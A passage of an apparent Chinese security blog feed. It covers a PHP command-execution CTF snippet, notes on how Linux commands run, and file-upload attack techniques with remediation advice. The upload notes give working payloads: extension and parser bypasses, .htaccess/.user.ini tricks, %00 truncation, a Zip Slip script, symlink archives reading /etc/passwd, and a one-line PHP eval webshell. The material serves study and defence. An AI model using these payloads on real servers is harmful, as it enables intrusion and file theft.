class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$white_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;$&#123;#&#125;\\(&lt;)\&#x27;0&#x27;</span>); </span><br><span class="line">    <span class="variable">$char_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$char_list</span> <span class="keyword">as</span> <span class="variable">$c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$c</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Cyzcc&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只能用&#96;$</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令本质</title>
      <link href="/2023/05/31/%E5%91%BD%E4%BB%A4%E6%9C%AC%E8%B4%A8/"/>
      <url>/2023/05/31/%E5%91%BD%E4%BB%A4%E6%9C%AC%E8%B4%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="命令本质"><a href="#命令本质" class="headerlink" title="命令本质"></a>命令本质</h2><p>命令实际上就是具有一定功能的二进制文件</p><h2 id="命令位置"><a href="#命令位置" class="headerlink" title="命令位置"></a>命令位置</h2><p>&#x2F;bin,&#x2F;usr&#x2F;bin，默认都是全体用户使用</p><p>&#x2F;sbin,&#x2F;usr&#x2F;sbin,默认root用户使用</p><h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p><img src="/../images/4dbf34717d434bb692683937feb52fea.png" alt="img"></p><h2 id="命令分类–外部和内建"><a href="#命令分类–外部和内建" class="headerlink" title="命令分类–外部和内建"></a>命令分类–外部和内建</h2><blockquote><p>内建命令实际上是shell程序的一部分，简单快速系统bash内置源码<br>比如：exit，history，cd，echo等。</p><p>外部命令是linux系统中的实用程序部分，外部命令的实体并不包含在shell中，但是其命令执行过程是由shell程序控制的。外部命令是在bash之外额外安装的，通常放在&#x2F;bin，&#x2F;usr&#x2F;bin，&#x2F;sbin，&#x2F;usr&#x2F;sbin等</p></blockquote><ul><li><p>查看外部命令存储位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220710194138135-1686283886642.png" alt="image-20220710194138135"></p><p>注：这里的PATH就是经常提到的环境变量</p><blockquote><p>当用户执行的是外部命令时，系统会在指定的多个路径中查找command的可执行文件，而定义这些路径的变量，就称为 PATH 环境变量，其作用就是告诉 Shell 待执行命令的可执行文件可能存放的位置，Shell 会在 PATH 变量包含的多个路径中逐个查找，直到找到为止（如果找不到，Shell 会提供用户“找不到此命令”）。</p></blockquote></li><li><p>判断命令是否为外部还是内建命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="built_in">command</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type vim</span><br><span class="line">vim is /usr/bin/vim</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type ps</span><br><span class="line">ps is hashed (/usr/bin/ps)</span><br></pre></td></tr></table></figure></li><li><p>区别</p><ul><li><p>外部命令</p><blockquote><p>当外部命令执行时，会创建出一个子进程。这种操作被称为衍生（forking）。外部命令ps很方便显示出它的父进程以及自己所对应的衍生子进程。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root      8986  8984  0 17:17 pts/0    00:00:00 -bash</span><br><span class="line">root      9054  8986  0 17:53 pts/0    00:00:00 ps -f</span><br></pre></td></tr></table></figure><p>ps进程的PPID为-bash的PID。</p><p><img src="/../images/image-20220923175907599.png" alt="image-20220710194138135"></p></li><li><p>内建命令</p><blockquote><p>内建命令和外部命令的区别在于前者不需要使用子进程来执行。</p><p>因为既不需要通过衍生出子进程来执行，也不需要打开程序文件，内建命令的执行速度要更</p><p>快，效率也更高。</p></blockquote></li></ul></li><li><p>有些命令有多种实现方式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type -a cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">cd is /usr/bin/cd</span><br></pre></td></tr></table></figure><blockquote><p>对于有多种实现的命令，如果想要使用其外部命令实现，直接指明对应的文件就可以了。</p><p>例如，要使用外部命令pwd，可以输入&#x2F;bin&#x2F;pwd。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞危害–攻击面"><a href="#漏洞危害–攻击面" class="headerlink" title="漏洞危害–攻击面"></a>漏洞危害–攻击面</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webshell类：脚本文件</span><br><span class="line">XSS类：svg，html，pdf文件,如果后端为nodejs，可以xss to rce</span><br><span class="line">SSRF类：PDF</span><br><span class="line">XXE类：docx、xlsx，svg</span><br><span class="line">RCE类：phar文件，配合文件读取反序列化攻击 # 鸡肋，要有源码，还要有危险方法</span><br><span class="line">目录穿越：文件覆盖，ssh公钥</span><br></pre></td></tr></table></figure><h1 id="PHP相关代码"><a href="#PHP相关代码" class="headerlink" title="PHP相关代码"></a>PHP相关代码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;file&#x27;]是Content-Disposition中name的值</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件名称</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的MIME类型       image/jpeg,image/png,application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 文件大小 单位字节</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后再服务器端临时文件名，可以在php.ini中指定</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 加入文件头绕过：GIF89a  </span></span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>()  图片大小</span><br><span class="line"><span class="title function_ invoke__">exif_imagetype</span>()  图片类型</span><br></pre></td></tr></table></figure><p>上传过程</p><blockquote><p>在文件上传结束后，文件默认被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用<code>copy或</code>者<code>move_uploaded_file</code>两个函数。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">       <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><ul><li><p>中间件配置不当，导致可以解析其他脚本后缀</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line">.php3 .php4 .php5  .pht  .phtml  .phar  .shtml </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .shtml    </span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;!--<span class="comment">#exec cmd=&quot;whoami&quot; --&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment"># jsp    </span></span><br><span class="line">.jsp .jspa .jsps .jspx </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .net</span></span><br><span class="line">.asp  .asa .cdx  .cer  .aspx .asmx  .ashx</span><br></pre></td></tr></table></figure></li><li><p>可以上传相关配置文件</p><ul><li><p>.htaccess</p><p><a href="https://blog.csdn.net/solitudi/article/details/116666720">CTF.htaccess的使用技巧总结_.htaccess ctf_Y4tacker的博客-CSDN博客</a></p><p>只能用于Apache</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当文件名中包含shell时，该文件会被Apache当作php解析</span></span><br><span class="line">&lt;FilesMatch &quot;shell&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#.png文件也可以执行php程序</span></span><br><span class="line">AddType application/x-httpd-php .png </span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启了cgi扩展：扩展名为.yyy的文件作为 CGI 脚本来处理</span></span><br><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .yyy</span><br></pre></td></tr></table></figure><p>修复</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在配置文件中将AllowOverride ALL改为AllowOverride None</span><br></pre></td></tr></table></figure></li><li><p>.user.ini</p><p>使用条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache和Nginx都可以，只需满足：</span><br><span class="line">服务器脚本语言为PHP 服务器使用CGI</span><br><span class="line">FastCGI模式</span><br><span class="line">上传目录下要有可执行的php文件</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=file_name  <span class="comment">#表示在加载第一个PHP代码之前先行预加载该配置所指示的PHP文件。</span></span><br><span class="line"></span><br><span class="line"><span class="attr">auto_append_file</span>=file_name  <span class="comment">#表示在加载第一个PHP代码之后执行预加载该配置所指示的PHP文件。</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>过滤不当</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">点绕过、空格绕过、后缀双写绕过、后缀大小写绕过</span><br></pre></td></tr></table></figure></li><li><p>Apache解析漏洞</p><ul><li><p>从右往左解析漏洞</p><p>产生原因：</p><p>前提：<strong>php作为apache的一个子模块来运行</strong></p><p><img src="/../images/image-20230617172156170.png" alt="image-20230617172156170"></p><p>apache支持一个文件拥有多个后缀，并为不同后缀执行不同的指令，如果运维人员给<code>.php</code> 后缀增加了处理器</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>Apache会从右向左，依次识别后缀，直到遇到自己能解析的文件名为止。那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code> 后缀的文件即将被识别成 PHP 文件。</p><p>假设上传的文件名为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxxx.php.xyz</span><br></pre></td></tr></table></figure><p>这时候最后一个可识别的扩展为.php，会将其作为php文件进行解析，轻松绕过<strong>黑白名单</strong>。</p><p>vulhub复现</p><p><img src="/../images/image-20230617172318530.png" alt="image-20230617172318530"></p><p>本地cgi模式复现</p></li></ul><p><img src="/../images/image-20230617172525788.png" alt="image-20230617172525788"></p><p><img src="/../images/image-20230617172355992.png" alt="image-20230617172355992"></p><ul><li><p>HTTPD换行解析漏洞–CVE-2017-15715</p><p>产生原因：</p><p>配置中的正则缺陷</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;[^ .]+\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>正则表达式中$不仅匹配字符串结尾位置，也可以匹配\n 或 \r，从而导致可以上传<code>.php\n</code>绕过<strong>黑名单</strong>校验，同时也可以被作为PHP文件解析。（不能是<code>.php\r\n</code>）</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传：1.php\x0a</span><br><span class="line">访问：1.php%0a</span><br></pre></td></tr></table></figure></li></ul><p>上述漏洞修复：因为Apache的解析漏洞是由于畸形扩展名和畸形文件名导致的，所以使用白名单，并对文件重命名，文件就不会存在畸形字符和多扩展名的情况。</p><p>参考如下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]会自动把换行去掉</span></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...其他检查</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, [<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="variable">$new_name</span> = <span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="图片白名单绕过"><a href="#图片白名单绕过" class="headerlink" title="图片白名单绕过"></a>图片白名单绕过</h1><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul><li>php版本&lt;5.3.4</li><li>magic_quotes_gpc关闭</li><li>保存的文件名可控</li></ul><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><p>后端使用<code>move_uploaded_file</code>来移动文件，<code>move_uploaded_file</code>函数底层为c语言，遇到0x00会截断（字符串结束标志）</p><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?save_path=../upload/shell.php%<span class="number">00</span></span><br><span class="line"></span><br><span class="line">filename=shell.jpg</span><br></pre></td></tr></table></figure><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><ul><li><p>5.x  , 6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 文件夹解析漏洞</span><br><span class="line">会将 *.asp/目录下的所有文件当成Asp解析</span><br></pre></td></tr></table></figure></li><li><p>6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 分号截断漏洞</span><br><span class="line">默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析; 号及其后面的内容，相当于截断。</span><br></pre></td></tr></table></figure></li></ul><p>修复方案：IIS服务器本身缺陷，升级版本&#x2F;打补丁</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><ul><li><p>文件类型错误解析漏洞（IIS7.x版本在Fast-CGI运行模式下也存在）</p><p>产生原因：</p><p><code>FastCGI</code>与<code>PHP</code>对PATH_INFO处理的差异。 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">上传图片，访问路径/图片路径/.php</span><br></pre></td></tr></table></figure><p>修复：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在php.ini中设置fix_pathinfo=0 或者设置security.limit_extensions = .php</span><br><span class="line">或者</span><br><span class="line">在nginx的配置文件中设置fastcgi_spilt_path_info  ^(.+\.php)(.*)$;</span><br></pre></td></tr></table></figure></li><li><p>空字节解析漏洞（CVE-2013-4547）</p><p>受影响版本：0.841<del>1.4.3&#x2F;1.5.0</del>1.5.7</p><p>产生原因：</p><p>nginx配置不当</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">当用户请求info.jpg%00.php时，因为info.jpg%00.php能够匹配正则&quot;.php$&quot;，所以可以进入该<span class="section">location</span>块。</span><br><span class="line">但是nginx在解析文件名时被%<span class="number">00</span>截断，导致以为请求的文件是info.jpg并发给fastcgi，所以fastcgi就将info.jpg当作php文件进行解析了。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">上传文件：info.jpg</span><br><span class="line">请求文件：info.jpg%<span class="number">00</span>.php</span><br></pre></td></tr></table></figure><p>修复：升级版本</p></li></ul><h3 id="配合文件包含"><a href="#配合文件包含" class="headerlink" title="配合文件包含"></a>配合文件包含</h3><ul><li><p>图片🐎</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  绕过宽高检查</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p><p>用数据量小的图片，比如随便截一张很小的图</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">普通：copy,直接插入</span><br><span class="line">二次渲染：找到前后图片中没有发生变化的hex数据，替换为木马</span><br></pre></td></tr></table></figure></li><li><p>文件包含trick</p></li></ul><h3 id="配合文件读取反序列化"><a href="#配合文件读取反序列化" class="headerlink" title="配合文件读取反序列化"></a>配合文件读取反序列化</h3><p>上传任意后缀的phar格式的文件，配合文件读取用<code>phar://</code>解析</p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">    <span class="comment"># move_uploaded_file成功后才判断是否合法</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原理：服务端先将上传的文件写入，再判断是否合法，通过条件竞争在文件删除前访问webshell写入新的webshell即可。</p><h1 id="压缩文件解压问题"><a href="#压缩文件解压问题" class="headerlink" title="压缩文件解压问题"></a>压缩文件解压问题</h1><p>服务端会对上传的压缩包进行解压，可以构造恶意压缩包攻击</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>Linux软链接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd test</span><br><span class="line">zip -y passwd.zip test  # -y 保证解压出来的还是软链接</span><br></pre></td></tr></table></figure><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><ul><li><p>通过构造压缩文件的文件名，造成目录穿越</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># the name of the zip file to generate</span></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span></span><br><span class="line">fname = <span class="string">&#x27;sec_test.txt&#x27;</span></span><br><span class="line"><span class="comment">#destination path of the file</span></span><br><span class="line">zf.write(fname, <span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>所有已发现受<code>Zip Slip</code>影响的项目:<a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p><p><strong>注</strong>：如果用的是命令<code>unzip</code>来解压，这种方法就没用了，因为<code>unzip</code> 默认跳过文件名中的<code>../</code></p></li><li><p>软链接的妙用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个软链接指向网站目录</span></span><br><span class="line">ln -s /var/www/html test</span><br><span class="line">zip -y 1.zip test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个与软链接同名的目录，并在该目录下创建木马文件</span></span><br><span class="line">mkdir a &amp;&amp; cd a </span><br><span class="line">mkdir test</span><br><span class="line">echo &#x27;&lt;?php @eval($_GET[1]); ?&gt;&#x27; &gt; test/shell.php</span><br><span class="line">chmod 777 test/shell.php</span><br><span class="line">zip -r 2.zip test</span><br></pre></td></tr></table></figure><p>然后先上传1.zip，解压得到软链接<code>test</code>，再上传2.zip，解压得到test目录和shell.php，因为test指向&#x2F;var&#x2F;www&#x2F;html,所以shell.php实际上是被解压到网站目录下</p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>From：代码审计知识星球</p><p>修改压缩包二进制字节，让压缩包解压过程出错，但是出错前已解压部分即为webshell。（出错后捕获异常，程序中止，如果开发人员没有对已解压部分进行校验，那么已解压出的webshell就可以留在服务端中）</p><p><a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html</a></p><h1 id="上传接口寻找"><a href="#上传接口寻找" class="headerlink" title="上传接口寻找"></a>上传接口寻找</h1><ul><li><p>通过观察命名来fuzz接口</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">uploadImg.cspx</span><br><span class="line">uploadfile.cspx</span><br><span class="line">uploadtest.cspx</span><br><span class="line"></span><br><span class="line">upload_test.cspx</span><br><span class="line">upload_2018.php</span><br><span class="line"></span><br><span class="line">upload2019.php</span><br><span class="line">upload2020.jsp</span><br></pre></td></tr></table></figure></li><li><p>上传接口测试</p></li></ul><p>From <a href="https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p><p><img src="/../images/image-20230605161933817.png" alt="image-20230605161933817"></p><h1 id="上传后问题"><a href="#上传后问题" class="headerlink" title="上传后问题"></a>上传后问题</h1><h3 id="文件路径寻找"><a href="#文件路径寻找" class="headerlink" title="文件路径寻找"></a>文件路径寻找</h3><p>From <a href="https://www.cnblogs.com/yokan/p/15252077.html">https://www.cnblogs.com/yokan/p/15252077.html</a></p><ul><li><p>因为传上去的文件，如图片这类的总归是显示出来的，所以可以先在web应用到处点点，多加载一些数据包，然后再到burp的http history搜索shell的名字</p></li><li><p><strong>返回了一些参数但不包括路径的情况</strong>，比如file_id 等等，那么文件路径可能存储在数据库中，可以<strong>结合sql注入</strong> sqlmap的–search -C参数找到字段和值</p></li><li><p><strong>什么都没返回的情况，只返回了ok，true等等。重新加载，抓包看响应，或许某个接口的响应就包括对应的路径。</strong></p><p>比如头像位置上传上去了，但是没有返回路径，那么想办法让他在加载一遍，比如退出重新登陆，一个包一个包的放。可能有些包的响应中就包含路径。</p><p>   另外可能存在其他服务器、或者其他站点的其他路径，也是抓包查看，看一下加载过程的路径在哪或者看一下html、js</p><p>[<img src="/../images/1964477-20210910165949941-1026982801.png" alt="img"></p></li><li><p><strong>尝试访问日志文件，看能否发现一些敏感目录或上传目录</strong></p></li><li><p><strong>只返回了文件名，没有路径</strong></p><p>一种是fuzz，看其他同类型文件的路径，f12或者如果有文件下载的地方，下载抓包，看文件地址。</p><p>另一种是 尝试上传的时候<strong>目录穿越</strong>，一次一次尝试，看能否<strong>穿到站点根目录</strong>或者<strong>知道的目录下面</strong>。修改表单的其他参数、或者filename参数的值</p></li></ul><h3 id="脚本文件访问403"><a href="#脚本文件访问403" class="headerlink" title="脚本文件访问403"></a>脚本文件访问403</h3><ul><li>尝试其他后缀</li><li>免杀</li></ul><h3 id="没有执行权限"><a href="#没有执行权限" class="headerlink" title="没有执行权限"></a>没有执行权限</h3><p>表现：访问时文件直接下载</p><p>尝试目录穿越，跳到可以执行脚本语言的目录</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">///../../../</span><br></pre></td></tr></table></figure><blockquote><p>以&#x2F;&#x2F;&#x2F;开头是因为可能会转码，导致写入失败</p></blockquote><h3 id="文件内容和流量检测"><a href="#文件内容和流量检测" class="headerlink" title="文件内容和流量检测"></a>文件内容和流量检测</h3><ul><li>免杀</li></ul><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li><p>白名单机制</p></li><li><p>上传文件重命名</p></li><li><p>隐藏上传文件路径</p></li><li><p>文件内容校验和过滤</p></li><li><p>避免条件竞争，先判断是否合法，而不是先将文件写入再判断是否合法</p></li><li><p>上传的文件统一放到一个地方，遵循以下原则</p><p><code>目录可写但不可解析，可解析但不可写入</code></p><p>或者上传到专门用来保存文件的地方，如存储OSS</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>任意文件读取和下载</title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%B8%8B%E8%BD%BD/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%B8%8B%E8%BD%BD/</url>
      
